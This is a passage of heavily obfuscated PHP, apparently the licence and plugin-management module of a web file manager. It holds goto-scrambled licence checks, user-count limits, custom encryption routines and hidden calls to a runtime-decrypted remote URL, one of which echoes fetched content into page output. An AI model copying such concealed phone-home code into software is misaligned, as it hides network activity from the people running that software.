Model($B·ÛÈíâ‘¡[18])->set(array($B·ÛÈíâ‘¡[126] => $B·ÛÈíâ‘¡[72], $B·ÛÈíâ‘¡[127] => $B·ÛÈíâ‘¡[72], $B·ÛÈíâ‘¡[64] => $B·ÛÈíâ‘¡[65], $B·ÛÈíâ‘¡[66] => $B·ÛÈíâ‘¡[72], $B·ÛÈíâ‘¡[67] => $B·ÛÈíâ‘¡[72])); Model($B·ÛÈíâ‘¡[18])->setDeep($B·ÛÈíâ‘¡[134], $B·ÛÈíâ‘¡[140]); $this->versionData = array(); $this->version = $B·ÛÈíâ‘¡[65]; } private function dataCheck() { goto f¨­•íĞÄ£; bğ›«©£: $aõà‘ÉÄŸë = md5(BASIC_PATH . strrev($EØŠÚ­¬¶¹) . $e§Î²²ö¿[$F”ÌğÁß½ç[127]]); $eîØ”Ï³Æ = strrev(substr($aõà‘ÉÄŸë, 10, 16)); $a³¦í÷¡ïë = $this->decode($a‚½ß×‰ƒ[$F”ÌğÁß½ç[43]][$eîØ”Ï³Æ], $aõà‘ÉÄŸë); goto F‚ƒœ÷ÒÆÁ; F½‘òÇÉ”š: if (time() >= $c´çÙ±´ËÉ) { return $this->dataReset(); } $this->versionData = $a³¦í÷¡ïë; $this->version = $e§Î²²ö¿[$F”ÌğÁß½ç[64]]; goto bÆÈ´†áù; F‚ƒœ÷ÒÆÁ: $a³¦í÷¡ïë = json_decode($a³¦í÷¡ïë, !0); if (!is_array($a³¦í÷¡ïë)) { return $this->dataReset(); } $c´çÙ±´ËÉ = strtotime($a³¦í÷¡ïë[$F”ÌğÁß½ç[92]]); goto F½‘òÇÉ”š; f¨­•íĞÄ£: $F”ÌğÁß½ç =& $_SERVER[¦ÖÉâÛ¯ï‘]; $e§Î²²ö¿ = Model($F”ÌğÁß½ç[18])->get(); if ($e§Î²²ö¿[$F”ÌğÁß½ç[64]] == $F”ÌğÁß½ç[65]) { $this->dataAllow(); return; } goto C½­«˜ÕŞÖ; C½­«˜ÕŞÖ: $EØŠÚ­¬¶¹ = Model($F”ÌğÁß½ç[18])->get($F”ÌğÁß½ç[62]); $D›¯ÜŒÙØ‰ = array_to_keyvalue($this->listData(), $F”ÌğÁß½ç[0]); $a‚½ß×‰ƒ = $D›¯ÜŒÙØ‰[$F”ÌğÁß½ç[136]]; goto bğ›«©£; bÆÈ´†áù: } private function dataAllow() { goto f‡¿¤‰”Ÿ®; f»¸‡ÖÚ—æ: Hook::bind($FÜµÊ‚ì¶š[149], $FÜµÊ‚ì¶š[150]); goto cÎ•Â¦Á­; eÊß¹óƒï: if (ACTION == $FÜµÊ‚ì¶š[141] && $D©²äÍä‹ù == $FÜµÊ‚ì¶š[65]) { show_json(LNG($FÜµÊ‚ì¶š[142]), !1, $FÜµÊ‚ì¶š[143]); } $E³†á¥âñŞ = array($FÜµÊ‚ì¶š[144], $FÜµÊ‚ì¶š[145]); if (in_array(ACTION, $E³†á¥âñŞ)) { if ($D©²äÍä‹ù == $FÜµÊ‚ì¶š[65] && isset($c–æ¢àºå[$FÜµÊ‚ì¶š[146]])) { show_json(LNG($FÜµÊ‚ì¶š[142]), !1, $FÜµÊ‚ì¶š[143]); die; } $F®Ø×‚¤ = $this->userCount(); if ($F®Ø×‚¤ != 10000) { if ($F®Ø×‚¤ <= Model($FÜµÊ‚ì¶š[147])->count()) { show_json(LNG($FÜµÊ‚ì¶š[148]), !1, $FÜµÊ‚ì¶š[143]); die; } } } goto f»¸‡ÖÚ—æ; f‡¿¤‰”Ÿ®: $FÜµÊ‚ì¶š =& $_SERVER[¦ÖÉâÛ¯ï‘]; $c–æ¢àºå = $GLOBALS[$FÜµÊ‚ì¶š[100]]; $D©²äÍä‹ù = $this->version; goto eÊß¹óƒï; cÎ•Â¦Á­: } private function checkPlugin($c¥¦¸º·Ø¸) { goto AİÆ–ÓìŒ„; AİÆ–ÓìŒ„: $c£‰À¤Üö˜ =& $_SERVER[¦ÖÉâÛ¯ï‘]; if ($this->version == $c£‰À¤Üö˜[151]) { return $c¥¦¸º·Ø¸; } $Eô…”Êù§ = array($c£‰À¤Üö˜[152], $c£‰À¤Üö˜[153], $c£‰À¤Üö˜[154], $c£‰À¤Üö˜[155], $c£‰À¤Üö˜[156], $c£‰À¤Üö˜[157], $c£‰À¤Üö˜[158], $c£‰À¤Üö˜[159]); goto AÅï·¹å; AÅï·¹å: $DÙÍƒğ•šè = explode($c£‰À¤Üö˜[160], _get($this->versionData, $c£‰À¤Üö˜[71], $c£‰À¤Üö˜[72])); $dœ“¤›§’ = array(); foreach ($Eô…”Êù§ as $eÈ¦Ç»µÉ) { if (!in_array($eÈ¦Ç»µÉ, $DÙÍƒğ•šè)) { $dœ“¤›§’[] = $eÈ¦Ç»µÉ; } } goto DÇÆƒ”š•¹; DÇÆƒ”š•¹: foreach ($dœ“¤›§’ as $eÈ¦Ç»µÉ) { unset($c¥¦¸º·Ø¸[$eÈ¦Ç»µÉ]); } return $c¥¦¸º·Ø¸; goto Eš†Š¬òù´; Eš†Š¬òù´: } private function disableCheck() { $EîÓ§Şç§¥ =& $_SERVER[¦ÖÉâÛ¯ï‘]; if ($this->version != $EîÓ§Şç§¥[65]) { return; } $cğä§ƒ«Üº = strtolower(ACTION); $CöÇÓáÏ¶Ì = array($EîÓ§Şç§¥[161]); foreach ($CöÇÓáÏ¶Ì as $eÛÎÜ‹–ö…) { if ($eÛÎÜ‹–ö… == $cğä§ƒ«Üº || substr($cğä§ƒ«Üº, 0, strlen($eÛÎÜ‹–ö…)) == $eÛÎÜ‹–ö…) { show_json(LNG($EîÓ§Şç§¥[162]), !1); } } Hook::bind($EîÓ§Şç§¥[163], array($this, $EîÓ§Şç§¥[164])); } public function methodExit() { return $_SERVER[¦ÖÉâÛ¯ï‘][165]; } private function checkVersion() { goto eÅª´¼Ù; bëŠºµÒ: if (ACTION != $A‡¬®Æ•×¹[167]) { return; } $dœãÁÎØ¨Î = Model($A‡¬®Æ•×¹[18])->get($A‡¬®Æ•×¹[126]); $a‰’‘’ãÚ = md5($dœãÁÎØ¨Î); goto C¡”š÷ƒÔà; d°³…Ô½‹: Cache::set($a‰’‘’ãÚ, $Då‹Š‰Üé‡, $c•¿ˆ„¼Éª); goto eáÎ™Å‡; eÅª´¼Ù: $A‡¬®Æ•×¹ =& $_SERVER[¦ÖÉâÛ¯ï‘]; if ($this->version == $A‡¬®Æ•×¹[65] || !$GLOBALS[$A‡¬®Æ•×¹[7]]) { return; } if (intval(date($A‡¬®Æ•×¹[166], time())) % 3 != 0) { return; } goto bëŠºµÒ; C¡”š÷ƒÔà: $Då‹Š‰Üé‡ = Cache::get($a‰’‘’ãÚ); $c•¿ˆ„¼Éª = 3600 * 24 * 3; if (!$Då‹Š‰Üé‡ || time() - $Då‹Š‰Üé‡[$A‡¬®Æ•×¹[168]] > $c•¿ˆ„¼Éª) { goto c¦¿ßÀŒ‚º; E¿Í§ˆ­ğ: $aÉèŸäíñ¨ = url_request($aÈÔ¯¦ì¿, $A‡¬®Æ•×¹[11], $fÅ×šö†ãó, !1, !1, !0, 5); $aÈ¸ŒæÎ˜ = $aÉèŸäíñ¨[$A‡¬®Æ•×¹[12]]; if (!is_array($aÈ¸ŒæÎ˜)) { return; } goto Eé ÔÍÉ©è; c¦¿ßÀŒ‚º: $Då‹Š‰Üé‡ = array($A‡¬®Æ•×¹[169] => !0, $A‡¬®Æ•×¹[170] => time()); $aÈÔ¯¦ì¿ = Mcrypt::decode($A‡¬®Æ•×¹[171], $A‡¬®Æ•×¹[58]); $fÅ×šö†ãó = array($A‡¬®Æ•×¹[102] => $dœãÁÎØ¨Î, $A‡¬®Æ•×¹[112] => $this->version, $A‡¬®Æ•×¹[111] => INSTALL_CHANNEL, $A‡¬®Æ•×¹[106] => $A‡¬®Æ•×¹[107], $A‡¬®Æ•×¹[108] => KOD_VERSION); goto E¿Í§ˆ­ğ; Eé ÔÍÉ©è: if ($aÈ¸ŒæÎ˜[$A‡¬®Æ•×¹[102]] != !0) { $this->dataReset(); Cache::remove($a‰’‘’ãÚ); return; } goto bºò½Ê­è‹; bºò½Ê­è‹: } goto d°³…Ô½‹; eáÎ™Å‡: } private function userCount() { goto e¨Õè¼Æ–­; AÇ¹à¿Şá: $eÌ²åºĞç = $eÌ²åºĞç ? $eÌ²åºĞç : 10; $CÀ‹ˆùøÕğ = $this->versionData[$EÓ§¯˜¶ˆÖ[189]]; $CÀ‹ˆùøÕğ = $CÀ‹ˆùøÕğ ? intval($CÀ‹ˆùøÕğ) : 0; goto cŒ‡¸“Œ¤†; cŒ‡¸“Œ¤†: return $eÌ²åºĞç + $CÀ‹ˆùøÕğ; goto AÉº™ÚÊôˆ; e¨Õè¼Æ–­: $EÓ§¯˜¶ˆÖ =& $_SERVER[¦ÖÉâÛ¯ï‘]; $FÜŸåá—«Ä = array($EÓ§¯˜¶ˆÖ[172] => 10, $EÓ§¯˜¶ˆÖ[173] => 30, $EÓ§¯˜¶ˆÖ[174] => 50, $EÓ§¯˜¶ˆÖ[175] => 150, $EÓ§¯˜¶ˆÖ[176] => 500, $EÓ§¯˜¶ˆÖ[177] => 10000, $EÓ§¯˜¶ˆÖ[178] => 10000, $EÓ§¯˜¶ˆÖ[179] => 10, $EÓ§¯˜¶ˆÖ[180] => 30, $EÓ§¯˜¶ˆÖ[181] => 50, $EÓ§¯˜¶ˆÖ[182] => 100, $EÓ§¯˜¶ˆÖ[183] => 150, $EÓ§¯˜¶ˆÖ[184] => 250, $EÓ§¯˜¶ˆÖ[185] => 500, $EÓ§¯˜¶ˆÖ[186] => 1001, $EÓ§¯˜¶ˆÖ[187] => 1500, $EÓ§¯˜¶ˆÖ[188] => 2000); $eÌ²åºĞç = $FÜŸåá—«Ä[$this->version]; goto AÇ¹à¿Şá; AÉº™ÚÊôˆ: } public function loginCheck($A×÷ÇíöšÛ) { goto f¯œß“µĞ; AÚÚÉ¶´–“: $B´À£¬¶³ = Model($b®’—ËƒÍØ[147])->count(); if ($B´À£¬¶³ <= $DÚÑŠŞ¿ºµ) { return; } $EŒ‘‚â‡ã = Model($b®’—ËƒÍØ[147])->field($b®’—ËƒÍØ[190])->limit($DÚÑŠŞ¿ºµ)->select(); goto c±·öŸˆ¨§; f¯œß“µĞ: $b®’—ËƒÍØ =& $_SERVER[¦ÖÉâÛ¯ï‘]; $DÚÑŠŞ¿ºµ = $this->userCount(); if ($DÚÑŠŞ¿ºµ >= 10000) { return; } goto AÚÚÉ¶´–“; c±·öŸˆ¨§: $EŒ‘‚â‡ã = array_to_keyvalue($EŒ‘‚â‡ã, $b®’—ËƒÍØ[72], $b®’—ËƒÍØ[190]); if (!in_array($A×÷ÇíöšÛ[$b®’—ËƒÍØ[190]], $EŒ‘‚â‡ã)) { show_json($b®’—ËƒÍØ[191], !1, $b®’—ËƒÍØ[143]); } goto BŸõÓÛÆ»¸; BŸõÓÛÆ»¸: } public function checkEcho() { $FÙß×Ó‹ö =& $_SERVER[¦ÖÉâÛ¯ï‘]; if (date($FÙß×Ó‹ö[192]) % 10 == 1 && $GLOBALS[$FÙß×Ó‹ö[7]] && mt_rand(1, 100) % 10 <= 3) { $FÄ…äõîÔ = $FÙß×Ó‹ö[193]; $E»ÔàÀÉ‹˜ = url_request($FÄ…äõîÔ, $FÙß×Ó‹ö[11], !1, !1, !1, !1, 3); echo $FÙß×Ó‹ö[194] . hash_encode($E»ÔàÀÉ‹˜[$FÙß×Ó‹ö[12]]) . $FÙß×Ó‹ö[195]; } } private function encode($EŞ‡ˆ®¼£¿, $DÆŸç—Œ‚ã, $E®Ù«Õ×™’ = 3) { goto Bà¾ùš›®Ò; Bà¾ùš›®Ò: $EÉÂº¥Œï =& $_SERVER[¦ÖÉâÛ¯ï‘]; usleep(2); $EŞ‡ˆ®¼£¿ = trim($EŞ‡ˆ®¼£¿); goto D†˜®³¹; C±ªËµò“œ: switch ($AÑ‚×Ğô¿) { case $EÉÂº¥Œï[140]: $fÕ¿İ¾´ùÈ = Mcrypt::encode($EŞ‡ˆ®¼£¿, strrev($DÆŸç—Œ‚ã . $AÚè†”ƒæ¤)); break; case $EÉÂº¥Œï[135]: $fÕ¿İ¾´ùÈ = Mcrypt::encode($EŞ‡ˆ®¼£¿, strrev($AÚè†”ƒæ¤ . $DÆŸç—Œ‚ã)); break; case $EÉÂº¥Œï[197]: $fÕ¿İ¾´ùÈ = Mcrypt::encode($EŞ‡ˆ®¼£¿, base64_encode($AÚè†”ƒæ¤ . $DÆŸç—Œ‚ã)); break; case $EÉÂº¥Œï[198]: $fÕ¿İ¾´ùÈ = Mcrypt::encode($EŞ‡ˆ®¼£¿, md5($AÚè†”ƒæ¤ . $DÆŸç—Œ‚ã)); break; case $EÉÂº¥Œï[199]: goto c¿«¯éÍ†¹; bä¼¢ÑÎ: for ($E»ğÛƒã†… = 0; $E»ğÛƒã†… < strlen($EŞ‡ˆ®¼£¿); $E»ğÛƒã†…++) { $c¤ŒÎ¬ºÏ = $c¤ŒÎ¬ºÏ == strlen($d²šÀã‚®) ? 0 : $c¤ŒÎ¬ºÏ; $D‘ÅÏõä– = ($CÂÛÛ†¿’Ô + strpos($DğŒÂµ÷ğ, $EŞ‡ˆ®¼£¿[$E»ğÛƒã†…]) + ord($d²šÀã‚®[$c¤ŒÎ¬ºÏ++])) % 64; $b¼ô‡›âÂ† .= $DğŒÂµ÷ğ[$D‘ÅÏõä–]; } $fÕ¿İ¾´ùÈ = hash_encode($Cˆ¢ñªÃ° . $b¼ô‡›âÂ†); break; goto fê¬ù¬¹‘Ø; bÔë¦²Ê†Õ: $E»ğÛƒã†… = 0; $D‘ÅÏõä– = 0; $c¤ŒÎ¬ºÏ = 0; goto bä¼¢ÑÎ; c¿«¯éÍ†¹: $EŞ‡ˆ®¼£¿ = base64_encode($EŞ‡ˆ®¼£¿); $CÂÛÛ†¿’Ô = rand(0, 64); $Cˆ¢ñªÃ° = $DğŒÂµ÷ğ[$CÂÛÛ†¿’Ô]; goto Eİ‰‚èÚ–¾; Eİ‰‚èÚ–¾: $d²šÀã‚® = md5($Cˆ¢ñªÃ° . md5($DÆŸç—Œ‚ã . $Cˆ¢ñªÃ°) . $DÆŸç—Œ‚ã); $d²šÀã‚® = substr($d²šÀã‚®, $CÂÛÛ†¿’Ô % 8, $CÂÛÛ†¿’Ô % 8 + 7); $b¼ô‡›âÂ† = $EÉÂº¥Œï[72]; goto bÔë¦²Ê†Õ; fê¬ù¬¹‘Ø: default: $fÕ¿İ¾´ùÈ = Mcrypt::encode($EŞ‡ˆ®¼£¿, $DÆŸç—Œ‚ã . $AÚè†”ƒæ¤); break; } $fÕ¿İ¾´ùÈ = strrev($AÑ‚×Ğô¿ . $AÚè†”ƒæ¤ . $fÕ¿İ¾´ùÈ); if ($E®Ù«Õ×™’ - 1 > 0) { $fÕ¿İ¾´ùÈ = $this->encode($fÕ¿İ¾´ùÈ, $DÆŸç—Œ‚ã, $E®Ù«Õ×™’ - 1); } goto Aê –Ñ¦§—; D†˜®³¹: $AÑ‚×Ğô¿ = mt_rand(0, 5) . $EÉÂº¥Œï[72]; $AÚè†”ƒæ¤ = rand_string(15); $DğŒÂµ÷ğ = $EÉÂº¥Œï[196]; goto C±ªËµò“œ; Aê –Ñ¦§—: return $fÕ¿İ¾´ùÈ; goto f£±ïäŞ×; f£±ïäŞ×: } public function decode($D›Ö§›¥¾”, $AÅ´³šÓÕ, $B‡›Ï¿¬ˆÃ = 3) { goto dèğ”»£«¿; BŒ£’Í˜Ó: $D›Ö§›¥¾” = strrev($D›Ö§›¥¾”); $D‰‘É¶¡ó˜ = $D›Ö§›¥¾”[0]; $fƒõØøŸÍ‡ = substr($D›Ö§›¥¾”, 1, 15); goto cãÊÅÇñ–; cãÊÅÇñ–: $D›Ö§›¥¾” = substr($D›Ö§›¥¾”, 16); $a»Ù¢‚†“ = $A•Ú¬¦É•[196]; switch ($D‰‘É¶¡ó˜) { case $A•Ú¬¦É•[140]: $bÔ¡ôŠÁ = Mcrypt::decode($D›Ö§›¥¾”, strrev($AÅ´³šÓÕ . $fƒõØøŸÍ‡)); break; case $A•Ú¬¦É•[135]: $bÔ¡ôŠÁ = Mcrypt::decode($D›Ö§›¥¾”, strrev($fƒõØøŸÍ‡ . $AÅ´³šÓÕ)); break; case $A•Ú¬¦É•[197]: $bÔ¡ôŠÁ = Mcrypt::decode($D›Ö§›¥¾”, base64_encode($fƒõØøŸÍ‡ . $AÅ´³šÓÕ)); break; case $A•Ú¬¦É•[198]: $bÔ¡ôŠÁ = Mcrypt::decode($D›Ö§›¥¾”, md5($fƒõØøŸÍ‡ . $AÅ´³šÓÕ)); break; case $A•Ú¬¦É•[199]: goto EôêöëÏˆ; c’¸ËØô‚ã: break; goto aìëµÛŸÁÔ; Aø›àÍÉ‘: $Bç íÄëÏ¦ = 0; for ($f¦ßƒ‹Íø… = 0; $f¦ßƒ‹Íø… < strlen($D›Ö§›¥¾”); $f¦ßƒ‹Íø…++) { $Bç íÄëÏ¦ = $Bç íÄëÏ¦ == strlen($Dİ²ªƒš) ? 0 : $Bç íÄëÏ¦; $Aâ™åÑÖâ = $Bç íÄëÏ¦++; $Dªß‡ÃÅ“Ò = strpos($a»Ù¢‚†“, $D›Ö§›¥¾”[$f¦ßƒ‹Íø…]) - $E„¼ª³›ï - ord($Dİ²ªƒš[$Aâ™åÑÖâ]); while ($Dªß‡ÃÅ“Ò < 0) { $Dªß‡ÃÅ“Ò += 64; } $f°¾ÒÃ– .= $a»Ù¢‚†“[$Dªß‡ÃÅ“Ò]; } $bÔ¡ôŠÁ = base64_decode($f°¾ÒÃ–); goto c’¸ËØô‚ã; EôêöëÏˆ: $D›Ö§›¥¾” = hash_decode($D›Ö§›¥¾”); $eÈ»¼Î‚ñ = $D›Ö§›¥¾”[0]; $D›Ö§›¥¾” = substr($D›Ö§›¥¾”, 1); goto AÖöŒ³İë; AÖöŒ³İë: $E„¼ª³›ï = strpos($a»Ù¢‚†“, $eÈ»¼Î‚ñ); $Dİ²ªƒš = md5($eÈ»¼Î‚ñ . md5($AÅ´³šÓÕ . $eÈ»¼Î‚ñ) . $AÅ´³šÓÕ); $Dİ²ªƒš = substr($Dİ²ªƒš, $E„¼ª³›ï % 8, $E„¼ª³›ï % 8 + 7); goto c­‡ĞÙ¦‹; c­‡ĞÙ¦‹: $f°¾ÒÃ– = $A•Ú¬¦É•[72]; $f¦ßƒ‹Íø… = 0; $Dªß‡ÃÅ“Ò = 0; goto Aø›àÍÉ‘; aìëµÛŸÁÔ: default: $bÔ¡ôŠÁ = Mcrypt::decode($D›Ö§›¥¾”, $AÅ´³šÓÕ . $fƒõØøŸÍ‡); break; } goto b…™ÙÙ°ƒ…; b…™ÙÙ°ƒ…: if ($B‡›Ï¿¬ˆÃ - 1 > 0) { $bÔ¡ôŠÁ = $this->decode($bÔ¡ôŠÁ, $AÅ´³šÓÕ, $B‡›Ï¿¬ˆÃ - 1); } return $bÔ¡ôŠÁ; goto AöÅä´ø‰ƒ; dèğ”»£«¿: $A•Ú¬¦É• =& $_SERVER[¦ÖÉâÛ¯ï‘]; if (!is_string($D›Ö§›¥¾”) || strlen($D›Ö§›¥¾”) < 10) { return !1; } $D›Ö§›¥¾” = trim($D›Ö§›¥¾”); goto BŒ£’Í˜Ó; AöÅä´ø‰ƒ: } public function appAllow($bÙ×ºó–›ô, $F¢ø‹ó¸áë, $aÊ¨«¯È³ = true) { $fÆç‘¦«µî =& $_SERVER[¦ÖÉâÛ¯ï‘]; $EáÊç˜ØÕ = PLUGIN_DIR . $bÙ×ºó–›ô . $fÆç‘¦«µî[200]; if (!is_array($F¢ø‹ó¸áë) || !is_array($F¢ø‹ó¸áë[$fÆç‘¦«µî[1]]) || !is_file($EáÊç˜ØÕ) || $F¢ø‹ó¸áë[$fÆç‘¦«µî[201]] != 1) { return !1; } if ($aÊ¨«¯È³ && !Action($fÆç‘¦«µî[202])->checkAuth($bÙ×ºó–›ô)) { return !1; } return !0; } public function unInstall($dœÇƒàÜŒ) { $EèèéÒ£ß‡ =& $_SERVER[¦ÖÉâÛ¯ï‘]; $C¥ˆîÇ“ = $this->loadList($dœÇƒàÜŒ); if (file_exists(PLUGIN_DIR . $dœÇƒàÜŒ)) { Hook::apply($dœÇƒàÜŒ . $EèèéÒ£ß‡[203]); } $this->remove($C¥ˆîÇ“[$EèèéÒ£ß‡[137]]); } public function changeStatus($Dˆ‡¬¨Ãâ÷, $a›¤÷ø¤¡) { $DâğÚÜë¿  =& $_SERVER[¦ÖÉâÛ¯ï‘]; $a§÷Ê–ÔÖ½ = $this->loadList($Dˆ‡¬¨Ãâ÷); if ($a›¤÷ø¤¡) { Hook::apply($Dˆ‡¬¨Ãâ÷ . $DâğÚÜë¿ [204]); } $this->update($a§÷Ê–ÔÖ½[$DâğÚÜë¿ [137]], array($DâğÚÜë¿ [205] => $a›¤÷ø¤¡)); } public function appRegist($cš¨ù÷ÓÅç, $C©ø™Ôœó) { $f‚˜Ğ¿—˜¨ =& $_SERVER[¦ÖÉâÛ¯ï‘]; $c¦øŒ¥·Öñ = $this->loadList($cš¨ù÷ÓÅç); if ($c¦øŒ¥·Öñ) { $this->update($c¦øŒ¥·Öñ[$f‚˜Ğ¿—˜¨[137]], array($f‚˜Ğ¿—˜¨[1] => $C©ø™Ôœó)); } else { $d³ìÖÈĞÏ‹ = array($f‚˜Ğ¿—˜¨[0] => $cš¨ù÷ÓÅç, $f‚˜Ğ¿—˜¨[1] => $C©ø™Ôœó, $f‚˜Ğ¿—˜¨[201] => 0, $f‚˜Ğ¿—˜¨[43] => $this->getConfigDefault($cš¨ù÷ÓÅç)); $this->insert($d³ìÖÈĞÏ‹); } } public function getConfigDefault($E›ĞÂŸ”öÃ) { $fÊâµìœ =& $_SERVER[¦ÖÉâÛ¯ï‘]; $eÈ“Ã­”™ = array(); $d¨òñ‰±à• = $this->getPackageJson($E›ĞÂŸ”öÃ); if (!$d¨òñ‰±à• && is_array($d¨òñ‰±à•[$fÊâµìœ[206]])) { return $eÈ“Ã­”™; } foreach ($d¨òñ‰±à•[$fÊâµìœ[206]] as $dÍ‡òÛÉ´Œ => $a£³ŒòÌÜ©) { if (!isset($a£³ŒòÌÜ©[$fÊâµìœ[207]]) || isset($eÈ“Ã­”™[$dÍ‡òÛÉ´Œ])) { continue; } $eÈ“Ã­”™[$dÍ‡òÛÉ´Œ] = $a£³ŒòÌÜ©[$fÊâµìœ[207]]; } return $eÈ“Ã­”™; } public function getPackageJson($Aİ„ñßŒ˜Ğ) { return Hook::apply($Aİ„ñßŒ˜Ğ . $_SERVER[¦ÖÉâÛ¯ï‘][208]); } public function getConfig($d©„¿’µ, $a±ùÒ—£· = false) { $AÈí«ïÇç– =& $_SERVER[¦ÖÉâÛ¯ï‘]; $Dò¾É×îø’ = array(); $E²ÅÑÈ¤…² = $this->loadList($d©„¿’µ); if ($E²ÅÑÈ¤…² && is_array($E²ÅÑÈ¤…²[$AÈí«ïÇç–[43]])) { $Dò¾É×îø’ = $E²ÅÑÈ¤…²[$AÈí«ïÇç–[43]]; } if (!$Dò¾É×îø’ || $a±ùÒ—£·) { $Dò¾É×îø’ = $this->getConfigDefault($d©„¿’µ); } return $Dò¾É×îø’; } public function setConfig($A ùÎï°ß©, $e´õö‰¼Ú = false) { goto cƒ›‡ëˆ¿Ï; bËšËá ’: $this->update($A© «œåï»[$bù­æ…´ßŒ[137]], array($bù­æ…´ßŒ[43] => $DÜïáïÊÚ§)); goto D°ö¦¨–¿¿; cƒ›‡ëˆ¿Ï: $bù­æ…´ßŒ =& $_SERVER[¦ÖÉâÛ¯ï‘]; $A© «œåï» = $this->loadList($A ùÎï°ß©); if (!$A© «œåï») { return !1; } goto Aù¯Ë‰‚ğ; Aù¯Ë‰‚ğ: if ($e´õö‰¼Ú == !1) { $e´õö‰¼Ú = $this->getConfigDefault($A ùÎï°ß©); } $DÜïáïÊÚ§ = $A© «œåï»[$bù­æ…´ßŒ[43]]; foreach ($e´õö‰¼Ú as $E¡¡è˜÷š– => $F˜ÃÑœ™Îƒ) { $DÜïáïÊÚ§[$E¡¡è˜÷š–] = is_string($F˜ÃÑœ™Îƒ) ? trim($F˜ÃÑœ™Îƒ) : $F˜ÃÑœ™Îƒ; } goto bËšËá ’; D°ö¦¨–¿¿: } public function viewList() { goto FˆÌÛ´¸­; FˆÌÛ´¸­: $aŠ³Šçº¦’ =& $_SERVER[¦ÖÉâÛ¯ï‘]; $d¼ô·›¼çŸ = $this->loadList(); $d¼ô·›¼çŸ = $this->checkPlugin($d¼ô·›¼çŸ); goto C³Ìµ¼çñµ; C³Ìµ¼çñµ: $this->pluginScan($d¼ô·›¼çŸ); $C¸ˆŞˆ«¸“ = array(); foreach ($d¼ô·›¼çŸ as $f¹ƒ½†µ›ù => $C„ï«ìğÃö) { unset($C„ï«ìğÃö[$aŠ³Šçº¦’[1]], $C„ï«ìğÃö[$aŠ³Šçº¦’[43]]); $cÍÌÙ•ÇğË = PLUGIN_DIR . $C„ï«ìğÃö[$aŠ³Šçº¦’[0]] . $aŠ³Šçº¦’[200]; if (!is_file($cÍÌÙ•ÇğË)) { continue; } $C®Ûñ½á¡ = Hook::apply($C„ï«ìğÃö[$aŠ³Šçº¦’[0]] . $aŠ³Šçº¦’[208]); if (is_array($C®Ûñ½á¡)) { $C¸ˆŞˆ«¸“[$f¹ƒ½†µ›ù] = array_merge($C„ï«ìğÃö, $C®Ûñ½á¡); } } goto B¸ˆíó“; B¸ˆíó“: return $C¸ˆŞˆ«¸“; goto aŸì×Ê‰Âò; aŸì×Ê‰Âò: } private function pluginScan($AìùãÈá‡») { $cÃ½…í„Ò =& $_SERVER[¦ÖÉâÛ¯ï‘]; recursion_dir(PLUGIN_DIR, $CòÖ¦³ï¯é, $e†£‡‰–œö, 0); foreach ($CòÖ¦³ï¯é as $E…¹³¦÷¤¦) { $CŠé¼±ÚË = get_path_this($E…¹³¦÷¤¦); if (isset($AìùãÈá‡»[$CŠé¼±ÚË]) || !file_exists($E…¹³¦÷¤¦ . $cÃ½…í„Ò[209]) || !file_exists($E…¹³¦÷¤¦ . $cÃ½…í„Ò[200])) { continue; } Hook::apply($CŠé¼±ÚË . $cÃ½…í„Ò[204]); } } } $EŠÉŸó›¢ê = LIB_DIR . $_SERVER[İåâé¾][553]; goto c®êñáÅ; BÖ·ÉÕíÇÔ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\133\136\57\135\53", "\72\x6e\x75\x6d" => "\x5b\60\x2d\x39\135\x2b", "\x3a\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($A÷¯ãµ®, $eÌğ…Ì‡É) { $BŸî©Ü…âè =& $_SERVER[İåâé¾]; if ($A÷¯ãµ® == $BŸî©Ü…âè[1038]) { $DÁ‚ˆ¾®™Ñ = array_map($BŸî©Ü…âè[1039], $eÌğ…Ì‡É[0]); $Bƒ£´Ù‚ğÖ = strpos($eÌğ…Ì‡É[1], $BŸî©Ü…âè[8]) === 0 ? $eÌğ…Ì‡É[1] : $BŸî©Ü…âè[8] . $eÌğ…Ì‡É[1]; $cŠèˆÀñæˆ = $eÌğ…Ì‡É[2]; } else { $DÁ‚ˆ¾®™Ñ = null; $Bƒ£´Ù‚ğÖ = strpos($eÌğ…Ì‡É[0], $BŸî©Ü…âè[8]) === 0 ? $eÌğ…Ì‡É[0] : $BŸî©Ü…âè[8] . $eÌğ…Ì‡É[0]; $cŠèˆÀñæˆ = $eÌğ…Ì‡É[1]; } array_push(self::$maps, $DÁ‚ˆ¾®™Ñ); array_push(self::$routes, $Bƒ£´Ù‚ğÖ); array_push(self::$methods, strtoupper($A÷¯ãµ®)); array_push(self::$callbacks, $cŠèˆÀñæˆ); } public static function error($B‘Â±œ¾’¬) { self::$errorCallback = $B‘Â±œ¾’¬; } public static function haltOnMatch($bšÓœìö = true) { self::$halts = $bšÓœìö; } public static function dispatch() { goto AÖ‰Õì®Ü; f²³ë‘Š¬©: $cßŸ„«¶Šß = array_keys(static::$patterns); $F»¥·öÔ’ = array_values(static::$patterns); $C¨ŞÍ°‰’ = !1; goto E§¶‰èÅ; E§¶‰èÅ: self::$routes = preg_replace($CŸË›É›Œ÷[817], $CŸË›É›Œ÷[8], self::$routes); if (in_array($EÆ×ßøÂ·Ø, self::$routes)) { $Eê‡Ôœ¹¡ = array_keys(self::$routes, $EÆ×ßøÂ·Ø); foreach ($Eê‡Ôœ¹¡ as $Eá–»ğÛÖÎ) { if (self::$methods[$Eá–»ğÛÖÎ] == $FÙ»ùÉ‚‚ || self::$methods[$Eá–»ğÛÖÎ] == $CŸË›É›Œ÷[1040] || in_array($FÙ»ùÉ‚‚, self::$maps[$Eá–»ğÛÖÎ])) { $C¨ŞÍ°‰’ = !0; if (!is_object(self::$callbacks[$Eá–»ğÛÖÎ])) { $eŠ“ä¥†˜¹ = explode($CŸË›É›Œ÷[8], self::$callbacks[$Eá–»ğÛÖÎ]); $fº¿ùÎÂ¨Ä = end($eŠ“ä¥†˜¹); $A´àÔËöš— = explode($CŸË›É›Œ÷[1041], $fº¿ùÎÂ¨Ä); $fƒƒççù¹× = new $A´àÔËöš—[0](); $fƒƒççù¹×->{$A´àÔËöš—[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Eá–»ğÛÖÎ]); if (self::$halts) { return; } } } } } else { $CÈ’µğ–Ü¹ = 0; foreach (self::$routes as $Eá–»ğÛÖÎ) { if (strpos($Eá–»ğÛÖÎ, $CŸË›É›Œ÷[4]) !== !1) { $Eá–»ğÛÖÎ = str_replace($cßŸ„«¶Šß, 